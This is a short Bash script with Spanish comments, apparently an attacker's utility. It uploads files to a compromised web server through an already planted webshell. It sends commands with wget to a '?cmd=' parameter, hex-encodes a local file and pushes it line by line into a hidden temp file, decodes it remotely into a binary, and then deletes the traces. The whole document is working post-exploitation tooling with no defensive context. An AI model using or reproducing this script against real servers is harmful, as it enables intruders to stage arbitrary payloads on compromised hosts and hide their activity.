#!/bin/bash

# ATENCION: subir primero manualmente binhex a servidor y compilar!!!!

# constantes constantes
TMPFILE='/tmp/.uws_hexbin'
BINHEX='./binhex'
HEXBIN='/tmp/hexbin'

# comprobacion de parametros
if [ $# -ne 3 ]
then
        echo "usa: $0 <url> <fich orig> <fich dest>"
        exit -1
fi

# parametros de entrada
url=$1
fi=$2
fo=$3

# ejecuta remotamente via webshell
function wsh
{
        # ejecuta remotamente
        wget -q --no-check-certificate -O /dev/null "$url?cmd=$1"

        # error ?
        if [ $? -ne 0 ]
        then
                echo 'error: fallo de conexion!'
                exit -1
        fi
}

# existe el fichero ?
if [ ! -e $fi ]
then
        echo 'error: fichero no existe!'
        exit -1
fi

echo -n "Subiendo fichero"

# creamo fichero en destino
wsh "> $TMPFILE"

# codificamos y enviamos linea a linea
for l in `$BINHEX < $fi`
do
        wsh "echo $l >> $TMPFILE"
        echo -n '.'
done

# decodificamos binario
wsh "$HEXBIN < $TMPFILE > $fo"

# borramos temporales
wsh "rm $TMPFILE"

# fin 
echo ' hecho!'

